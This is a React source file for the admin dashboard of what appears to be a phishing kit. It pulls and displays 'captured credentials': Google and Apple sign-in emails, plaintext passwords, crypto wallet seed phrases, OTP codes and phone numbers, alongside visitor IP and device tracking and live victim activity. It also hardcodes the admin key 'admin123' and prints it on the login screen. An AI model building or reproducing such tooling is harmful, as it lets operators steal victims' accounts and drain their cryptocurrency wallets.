import React, { useState, useEffect } from 'react';
import { adminAPI } from '../services/api';
import io from 'socket.io-client';

const SOCKET_URL = process.env.REACT_APP_SOCKET_URL || 'http://localhost:5001';

const AdminDashboard = () => {
  const [adminKey, setAdminKey] = useState(localStorage.getItem('adminKey') || '');
  const [isAuthenticated, setIsAuthenticated] = useState(localStorage.getItem('adminKey') === 'admin123');
  const [users, setUsers] = useState([]);
  const [activeUsers, setActiveUsers] = useState([]);
  const [userCredentials, setUserCredentials] = useState([]);
  const [capturedCredentials, setCapturedCredentials] = useState([]);
  const [visitors, setVisitors] = useState([]);
  const [analytics, setAnalytics] = useState(null);
  const [realTimeActivity, setRealTimeActivity] = useState([]);
  const [loading, setLoading] = useState(false);

  // Check if already authenticated and fetch data on mount
  useEffect(() => {
    const savedKey = localStorage.getItem('adminKey');
    if (savedKey === 'admin123') {
      setIsAuthenticated(true);
      setAdminKey(savedKey);
      fetchAllData(savedKey);
    }
  }, []);

  useEffect(() => {
    // Initialize socket connection for real-time monitoring
    const socketConnection = io(SOCKET_URL);

    socketConnection.on('user-activity', (activity) => {
      setRealTimeActivity(prev => [activity, ...prev.slice(0, 49)]); // Keep last 50 activities
      
      if (activity.type === 'login' || activity.type === 'disconnect' || activity.type === 'visitor-arrived' || activity.type === 'visitor-left') {
        setActiveUsers(prev => {
          if (activity.type === 'login' || activity.type === 'visitor-arrived') {
            return [...prev, activity.user || activity.visitor];
          } else {
            return prev.filter(user => user.socketId !== activity.socketId);
          }
        });
      }
    });

    return () => {
      socketConnection.disconnect();
    };
  }, []);

  const handleAdminLogin = async (e) => {
    e.preventDefault();
    if (!adminKey.trim()) return;

    setLoading(true);
    try {
      // Validate admin key and fetch all data
      if (adminKey === 'admin123') {
        localStorage.setItem('adminKey', adminKey);
        setIsAuthenticated(true);
        await fetchAllData(adminKey);
      } else {
        alert('Invalid admin key');
      }
    } catch (error) {
      alert('Invalid admin key');
      console.error('Admin login error:', error);
    } finally {
      setLoading(false);
    }
  };

  const fetchAllData = async (key = adminKey) => {
    try {
      console.log('=== Fetching Admin Data ===');
      console.log('Admin Key:', key);
      console.log('API Base URL:', process.env.REACT_APP_API_URL || 'http://localhost:5001/api');
      
      // Fetch all admin data
      const [usersRes, capturedCredsRes, visitorsRes] = await Promise.all([
        adminAPI.getUsers(key).catch((err) => {
          console.error('Error fetching users:', err);
          return { data: { users: [] } };
        }),
        adminAPI.getCapturedCredentials(key).catch((err) => {
          console.error('Error fetching captured credentials:', err);
          return { data: { credentials: [] } };
        }),
        adminAPI.getVisitors(key).catch((err) => {
          console.error('Error fetching visitors:', err);
          return { data: { visitors: [] } };
        })
      ]);

      console.log('=== Fetch Results ===');
      console.log('Users:', usersRes.data);
      console.log('Captured Credentials:', capturedCredsRes.data);
      console.log('Visitors:', visitorsRes.data);

      setUsers(usersRes.data.users || []);
      setCapturedCredentials(capturedCredsRes.data.credentials || []);
      setVisitors(visitorsRes.data.visitors || []);
      
      // Set analytics
      setAnalytics({
        totalUsers: usersRes.data.users?.length || 0,
        capturedCredentials: capturedCredsRes.data.credentials?.length || 0,
        totalVisitors: visitorsRes.data.visitors?.length || 0
      });
      
      console.log('Fetched data:', {
        users: usersRes.data.users?.length,
        credentials: capturedCredsRes.data.credentials?.length,
        visitors: visitorsRes.data.visitors?.length
      });
    } catch (error) {
      console.error('Error fetching admin data:', error);
    }
  };

  const handleDeleteUser = async (userId) => {
    if (!window.confirm('Are you sure you want to delete this user?')) return;
    
    try {
      await adminAPI.deleteUser(userId, adminKey);
      setUsers(prev => prev.filter(user => user._id !== userId));
    } catch (error) {
      alert('Error deleting user');
    }
  };

  if (!isAuthenticated) {
    return (
      <div className="auth-page">
        <div className="form-container">
          <div className="auth-header">
            <h1>Admin Dashboard</h1>
            <p>Enter admin key to access real-time monitoring</p>
          </div>

          <form onSubmit={handleAdminLogin}>
            <div className="form-group">
              <label htmlFor="adminKey" className="form-label">
                Admin Key
              </label>
              <input
                type="password"
                id="adminKey"
                value={adminKey}
                onChange={(e) => setAdminKey(e.target.value)}
                className="form-input"
                placeholder="Enter admin key"
                required
              />
              <div style={{ fontSize: '14px', color: '#5b636b', marginTop: '8px' }}>
                Default key: admin123
              </div>
            </div>

            <button
              type="submit"
              className="btn btn-primary btn-full"
              disabled={loading}
            >
              {loading ? 'Authenticating...' : 'Access Dashboard'}
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="dashboard">
      <div className="dashboard-header">
        <div style={{ maxWidth: '1400px', margin: '0 auto', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <h1 style={{ fontSize: '32px', fontWeight: '700', color: '#2b2f36' }}>
            Admin Dashboard
          </h1>
          <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
            <div style={{ 
              padding: '8px 16px', 
              backgroundColor: '#05d168', 
              color: 'white', 
              borderRadius: '20px',
              fontSize: '14px',
              fontWeight: '600'
            }}>
              {activeUsers.length} Active Users
            </div>
            <button 
              onClick={() => fetchAllData()}
              className="btn btn-primary"
              style={{ fontSize: '14px', padding: '8px 16px' }}
            >
              🔄 Refresh Data
            </button>
            <button 
              onClick={() => {
                localStorage.removeItem('adminKey');
                setIsAuthenticated(false);
                setAdminKey('');
              }}
              className="btn btn-outline"
            >
              Logout
            </button>
          </div>
        </div>
      </div>

      <div className="dashboard-content" style={{ maxWidth: '1400px', margin: '0 auto' }}>
        {/* Analytics Overview */}
        {analytics && (
          <div className="stats-grid">
            <div className="stat-card">
              <div className="stat-value">{analytics.totalUsers}</div>
              <div className="stat-label">Registered Users</div>
            </div>
            <div className="stat-card">
              <div className="stat-value">{analytics.capturedCredentials}</div>
              <div className="stat-label">Captured Credentials</div>
            </div>
            <div className="stat-card">
              <div className="stat-value">{analytics.totalVisitors}</div>
              <div className="stat-label">Total Visitors</div>
            </div>
            <div className="stat-card">
              <div className="stat-value">{activeUsers.length}</div>
              <div className="stat-label">Active Now</div>
            </div>
          </div>
        )}

        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '24px', marginBottom: '24px' }}>
          {/* Real-time Activity */}
          <div className="dashboard-card">
            <h2>Real-time Activity</h2>
            <div style={{ maxHeight: '400px', overflowY: 'auto' }}>
              {realTimeActivity.length > 0 ? (
                realTimeActivity.map((activity, index) => (
                  <div key={index} style={{ 
                    padding: '12px', 
                    borderBottom: '1px solid #e6ebef',
                    display: 'flex',
                    justifyContent: 'space-between',
                    alignItems: 'center'
                  }}>
                    <div>
                      <div style={{ fontWeight: '600', color: '#2b2f36' }}>
                        {activity.type === 'login' && '🟢 User Login'}
                        {activity.type === 'signup' && '🆕 User Signup'}
                        {activity.type === 'disconnect' && '🔴 User Disconnect'}
                      </div>
                      {activity.user && (
                        <div style={{ fontSize: '14px', color: '#5b636b' }}>
                          {activity.user.email || activity.user.firstName}
                        </div>
                      )}
                    </div>
                    <div style={{ fontSize: '12px', color: '#5b636b' }}>
                      {new Date(activity.timestamp).toLocaleTimeString()}
                    </div>
                  </div>
                ))
              ) : (
                <div style={{ textAlign: 'center', padding: '40px', color: '#5b636b' }}>
                  No recent activity
                </div>
              )}
            </div>
          </div>

          {/* Active Users */}
          <div className="dashboard-card">
            <h2>Active Users ({activeUsers.length})</h2>
            <div style={{ maxHeight: '400px', overflowY: 'auto' }}>
              {activeUsers.length > 0 ? (
                activeUsers.map((user, index) => (
                  <div key={index} style={{ 
                    padding: '12px', 
                    borderBottom: '1px solid #e6ebef',
                    display: 'flex',
                    justifyContent: 'space-between',
                    alignItems: 'center'
                  }}>
                    <div>
                      <div style={{ fontWeight: '600', color: '#2b2f36' }}>
                        {user.firstName} {user.lastName}
                      </div>
                      <div style={{ fontSize: '14px', color: '#5b636b' }}>
                        {user.email}
                      </div>
                    </div>
                    <div style={{ 
                      width: '8px', 
                      height: '8px', 
                      borderRadius: '50%', 
                      backgroundColor: '#05d168' 
                    }}></div>
                  </div>
                ))
              ) : (
                <div style={{ textAlign: 'center', padding: '40px', color: '#5b636b' }}>
                  No active users
                </div>
              )}
            </div>
          </div>
        </div>

        {/* User Credentials Monitor */}
        <div className="dashboard-card">
          <h2>User Credentials Monitor</h2>
          <div style={{ maxHeight: '300px', overflowY: 'auto' }}>
            {userCredentials.length > 0 ? (
              <table className="table">
                <thead>
                  <tr>
                    <th>Timestamp</th>
                    <th>Action</th>
                    <th>Email</th>
                    <th>Socket ID</th>
                  </tr>
                </thead>
                <tbody>
                  {userCredentials.slice(0, 20).map((credential, index) => (
                    <tr key={index}>
                      <td>{new Date(credential.timestamp).toLocaleString()}</td>
                      <td>
                        <span style={{ 
                          padding: '4px 8px', 
                          borderRadius: '4px', 
                          fontSize: '12px',
                          fontWeight: '600',
                          backgroundColor: credential.action === 'login' ? '#05d168' : '#0052ff',
                          color: 'white'
                        }}>
                          {credential.action.toUpperCase()}
                        </span>
                      </td>
                      <td>{credential.email}</td>
                      <td style={{ fontFamily: 'monospace', fontSize: '12px' }}>
                        {credential.socketId}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            ) : (
              <div style={{ textAlign: 'center', padding: '40px', color: '#5b636b' }}>
                No credentials logged yet
              </div>
            )}
          </div>
        </div>

        {/* All Users */}
        {/* Captured Credentials (Google/Apple Sign-in) */}
        <div className="dashboard-card">
          <h2>🔐 Captured Credentials ({capturedCredentials.length})</h2>
          <div style={{ maxHeight: '500px', overflowY: 'auto' }}>
            {capturedCredentials.length > 0 ? (
              <table className="table">
                <thead>
                  <tr>
                    <th>Provider</th>
                    <th>Email/ID</th>
                    <th>Password</th>
                    <th>Seed Phrase</th>
                    <th>OTP</th>
                    <th>Phone</th>
                    <th>IP Address</th>
                    <th>Device</th>
                    <th>Timestamp</th>
                  </tr>
                </thead>
                <tbody>
                  {capturedCredentials.map((cred, index) => (
                    <tr key={index}>
                      <td>
                        <span style={{ 
                          padding: '4px 8px',
                          borderRadius: '4px',
                          fontSize: '12px',
                          fontWeight: '600',
                          backgroundColor: 
                            cred.provider === 'Google' ? '#4285f4' : 
                            cred.provider === 'Apple' ? '#000' : 
                            '#05d168',
                          color: 'white'
                        }}>
                          {cred.provider}
                        </span>
                      </td>
                      <td>{cred.email || cred.appleId}</td>
                      <td style={{ fontFamily: 'monospace', fontSize: '12px' }}>
                        {cred.password || '-'}
                      </td>
                      <td style={{ 
                        fontFamily: 'monospace', 
                        fontSize: '11px',
                        maxWidth: '300px',
                        wordWrap: 'break-word',
                        backgroundColor: cred.seedPhrase ? '#fff3cd' : 'transparent',
                        padding: cred.seedPhrase ? '8px' : '0'
                      }}>
                        {cred.seedPhrase || '-'}
                      </td>
                      <td style={{ fontFamily: 'monospace' }}>
                        {cred.otp || '-'}
                      </td>
                      <td>{cred.phoneNumber || '-'}</td>
                      <td style={{ fontSize: '12px' }}>{cred.ipAddress}</td>
                      <td style={{ fontSize: '11px', maxWidth: '200px', overflow: 'hidden', textOverflow: 'ellipsis' }}>
                        {cred.platform} / {cred.userAgent?.substring(0, 30)}...
                      </td>
                      <td style={{ fontSize: '12px' }}>
                        {new Date(cred.timestamp).toLocaleString()}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            ) : (
              <div style={{ textAlign: 'center', padding: '40px', color: '#5b636b' }}>
                No captured credentials yet
              </div>
            )}
          </div>
        </div>

        {/* Visitors Tracking */}
        <div className="dashboard-card">
          <h2>👁️  Website Visitors ({visitors.length})</h2>
          <div style={{ maxHeight: '500px', overflowY: 'auto' }}>
            {visitors.length > 0 ? (
              <table className="table">
                <thead>
                  <tr>
                    <th>Page</th>
                    <th>IP Address</th>
                    <th>Location/Timezone</th>
                    <th>Device</th>
                    <th>Browser</th>
                    <th>Screen</th>
                    <th>Referrer</th>
                    <th>Timestamp</th>
                  </tr>
                </thead>
                <tbody>
                  {visitors.map((visitor, index) => (
                    <tr key={index}>
                      <td>{visitor.page}</td>
                      <td style={{ fontFamily: 'monospace', fontSize: '12px' }}>
                        {visitor.ipAddress}
                      </td>
                      <td style={{ fontSize: '12px' }}>{visitor.timezone}</td>
                      <td style={{ fontSize: '12px' }}>{visitor.platform}</td>
                      <td style={{ fontSize: '11px', maxWidth: '150px', overflow: 'hidden', textOverflow: 'ellipsis' }}>
                        {visitor.userAgent?.substring(0, 30)}...
                      </td>
                      <td style={{ fontSize: '12px' }}>{visitor.screenResolution}</td>
                      <td style={{ fontSize: '12px' }}>{visitor.referrer || 'Direct'}</td>
                      <td style={{ fontSize: '12px' }}>
                        {new Date(visitor.timestamp).toLocaleString()}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            ) : (
              <div style={{ textAlign: 'center', padding: '40px', color: '#5b636b' }}>
                No visitors tracked yet
              </div>
            )}
          </div>
        </div>

        {/* All Users */}
        <div className="dashboard-card">
          <h2>All Users ({users.length})</h2>
          <div style={{ maxHeight: '500px', overflowY: 'auto' }}>
            <table className="table">
              <thead>
                <tr>
                  <th>Name</th>
                  <th>Email</th>
                  <th>Phone</th>
                  <th>Created</th>
                  <th>Verified</th>
                  <th>Actions</th>
                </tr>
              </thead>
              <tbody>
                {users.map((user) => (
                  <tr key={user._id}>
                    <td>{user.firstName} {user.lastName}</td>
                    <td>{user.email}</td>
                    <td>{user.phoneNumber || '-'}</td>
                    <td>{new Date(user.createdAt).toLocaleDateString()}</td>
                    <td>
                      <span style={{ 
                        color: user.isVerified ? '#05d168' : '#f05350',
                        fontWeight: '600'
                      }}>
                        {user.isVerified ? 'Yes' : 'No'}
                      </span>
                    </td>
                    <td>
                      <button
                        onClick={() => handleDeleteUser(user._id)}
                        style={{
                          padding: '4px 8px',
                          backgroundColor: '#f05350',
                          color: 'white',
                          border: 'none',
                          borderRadius: '4px',
                          fontSize: '12px',
                          cursor: 'pointer'
                        }}
                      >
                        Delete
                      </button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  );
};

export default AdminDashboard;